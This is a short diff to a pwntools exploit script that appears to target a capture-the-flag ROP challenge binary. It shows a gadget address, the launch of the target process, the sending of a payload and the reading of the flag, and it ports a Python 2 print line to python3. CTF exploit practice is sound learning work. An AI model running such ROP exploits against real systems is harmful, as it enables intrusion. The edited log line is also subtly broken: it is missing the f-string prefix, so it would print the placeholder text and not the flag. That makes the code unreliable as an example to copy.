@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 from pwn import *
 
 mov_r11_into_r10_pop_pop_r12_xor_r12b_into_r10_addr = 0x000000000040084e
@@ -57,5 +59,4 @@ p = process(elf.path)
 p.recvuntil('> ')
 p.sendline(payload)
 
-print 'Flag:', p.recv(1024)
-
+log.info("Flag: {p.recv(1024).decode()}")
